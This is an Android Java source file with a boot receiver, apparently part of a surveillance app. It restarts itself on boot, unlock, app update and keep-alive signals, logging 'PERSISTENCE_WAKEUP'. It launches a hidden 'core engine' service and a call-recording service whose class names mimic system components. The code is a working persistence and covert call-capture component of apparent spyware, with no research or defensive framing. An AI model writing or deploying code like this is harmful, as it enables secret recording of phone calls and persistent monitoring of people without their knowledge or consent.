package com.labs.labrats;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class SystemBoot extends android.content.BroadcastReceiver {
    @Override
    public void onReceive(android.content.Context context, android.content.Intent intent) {
        String action = intent != null ? intent.getAction() : null;
        if (android.content.Intent.ACTION_BOOT_COMPLETED.equals(action) || 
            android.content.Intent.ACTION_USER_PRESENT.equals(action) ||
            android.content.Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
            Constants.ACTION_KEEP_ALIVE.equals(action) || 
            Constants.ACTION_AUTO_START.equals(action)) {
            
            android.util.Log.d("SystemBoot", "PERSISTENCE_WAKEUP: Triggered by " + action);

            // Start Core Engine
            android.content.Intent serviceIntent = new android.content.Intent(context, WorkManager_Sync.class);
            serviceIntent.setAction(Constants.ACTION_START_CORE);

            androidx.core.content.ContextCompat.startForegroundService(context, serviceIntent);

            // Start Call Record Service for call detection
            android.content.Intent callServiceIntent = new android.content.Intent(context, MediaFrameworkService.class);
            callServiceIntent.setAction(Constants.ACTION_START_AUDIO);
            androidx.core.content.ContextCompat.startForegroundService(context, callServiceIntent);
        }
    }
}
